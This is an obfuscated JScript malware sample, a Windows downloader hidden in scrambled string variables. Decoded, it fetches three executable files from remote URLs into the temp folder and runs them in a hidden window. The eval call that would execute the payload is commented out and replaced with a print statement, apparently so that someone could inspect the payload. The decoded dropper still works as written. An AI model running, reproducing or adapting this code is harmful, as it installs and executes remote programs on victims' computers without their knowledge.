var nuodg='fkqusvnwzcuqtdlivqovancp afdmqliz(iofvtrmo,cn hjfgunpe,xl ssrcbnnf)mm{ij ch alvokaycrzh xowyysgp nu=vk ivnzrelnwpq mvAzbcngtyciesvxmensXrlOdfbosjdrelmccbtrm(ew"byWwbSzpcibrgpidxpgttkz.ufSsjhgsedkllllhe"rf)gc;xd qd javntayarny zwfreniv qj=ho mbwuhsve.cuEsfxcfptcacinbidzhEgwnbxvififirzhothngomnaetanxftoeSrdthxrgmiatnklgirsou(jc"mr%rbToxEjyM';
var halujc='qpPau%bo"ta)qy eq+tn icSfmtvjrkoitxndygtr.tjfwfrdcoskmptCjthyqalfrplCzhojkdrxepe(oo9db2ff)it si+zk txfmvnii;rf br wgvbjayerxi fsxrconb ap=gz zinfqeegwuu rvAtqcbatmximhvwvenqXecOfnbhyjfweoccpftvs(ym"lqMjeSfyXlfMmlLhc2ej.mvXnjMduLlrHuaTgbTpzPvs"dp)mi;lk ad fhxwwomv.vtovwngmrkzeziatbdixyypseotrpawxtymegfcjghqeaajnwbgouein ba=wv byfuqusdnxgco';
var ifkijq='mtrjitmovdnwc tj(zv)hf{rp vk bx de tsipgfvm aw(wfxvrozi.uyrtvegkahddcfydhSretmsaultvjeut it=ni=nv=jw ob4cq)ak{di yi hd av xu gj uovhxaicrex krxoiagy nq=vf qwnkceakwvx ggAmickxteoichvhielxXqwOzrboxjwdexqcretau(lj"toAvoDlsOyiDylBho.plSbutgzruyeftapmmjy"bk)ai;ge bc vt uz vp ce wsxhlabn.fyoybpglersned(um)kt;lw tn eu nc ct pu vtxjhake.putmayqa';
var gpmxz='pduekf yl=db zl1uu;xs qd tu nh dq ua erxinakx.lmwzurzdilhthfeyw(fyxanoca.usRurevkspqphbolcnsqspueeqByyoizdugygf)az;mf yu en ky xb uc uixxoajg.dzpujogqspoiretxkiewoitnel ze=lb jo0jm;ql ux kt ab ty ze gaxxzazl.srsofatyvcsevbTezohsFxliadlvceia(clfbqngj,oq kk2ri)em;si qd px kg qv ni qfxqjazw.uucnylqpoofsffeyv(er)bp;ok tr yk iu nc}qe um ao wa ';
var noh='id;kr xp kx}qg ns ut;vo gh xktjqrwsyza il{kd ic ne nq rxxymorn.groxtpmpeeungi(vk"qfGstEgiTfp"ec,dd alfucrxy,cr imfjqamnllesyceqz)tp;vi ob jx ky byxxeohd.fgsxsevdnfkdxi(bk)as;vm gw iu fr xcizrfkq et(ebrwlncq rs>lb rz0co)lg{kv cz ed ge ve yg cewvfslv.ynRqkuxdnao(vnfmonhq,ib ja0kj,ro cd0ht)fq;vo bn jl ob nl}zy jy gk mx qe;zx al lu}tz ac qycf';
var ohee='tabbtehcwphmp jf(gfekerbb)ie{zq al qx}ur ci md;zw}lmdjzlnz(wr"bjhnjtxutzcpka:ih/jg/expfgioknrepcuofurxoipgnppgejsek.uhcizovtmcu/dzictmzsgkk/gcsqqciyrwziakprktqg.fipbrhatprj?feifpbjmdda1pg.fyjnjpvzgeh"ul,eb ma"pd3sx2ck7wv4sk9sb3bc5rf.fzeopxtyesx"vn,zj aq1sr)ju;tadnylkf(oo"pkhcptphteopge:kk/ys/xopndigbnhepniodarjiijlnvogvpsnz.wgcnboipmkt/pj';
var qukoh='iinmlugwj/hosbscxxropiroplltls.hfpnchfkpux?uyipybdidti2vn.qvjzapbrgdt"jn,lf kr"li4ou5hq7qc3oa2zj0ia5ls.epeizxgeeoh"cu,lk uv1un)ai;zjdtslve(sz"sqhwptmatxnplz:xf/lu/krpwdioinnfpxeotvrprikcnfvgwvsvb.xecaioxwmxd/sdiclmrsgrs/qvsfycxdrvoijxpcntjw.djpsfhmaptq?ixijkbecdwf3ez.dhjwopligkg"sp,jd gu"uo2wc9jo5zh4cp8jn6qp9lo.acezqxxaejk"jw,ke zo1mp)wq;';
var qrzxyv='lw';
var gtazezehn=nuodg+halujc+ifkijq+gpmxz+noh+ohee+qukoh+qrzxyv;
   var pvtjlgpsa="";
   var mcjmmxxa=3;
   var uqtynzvcoa=gtazezehn.split("");
   var yjcuxugjme="";
//         var y = new ActiveXObject("Scri"+"pting.Di"+"ctionary");
//   y.add ("a", "t");
//      if (y.Item("a")=="t"){yjcuxugjme="tkr";
//}else{mcjmmxxa=0;
//};
for (i=0;i<uqtynzvcoa.length;i +=mcjmmxxa){
   pvtjlgpsa=pvtjlgpsa+uqtynzvcoa[i];
}

print (pvtjlgpsa);
//   var yjcuxugjme="tkretkrvtkratkrl".split(yjcuxugjme).join("");
//   var bqjdecshd=this[yjcuxugjme];
//   bqjdecshd(pvtjlgpsa);
        //5hfdBDaOaT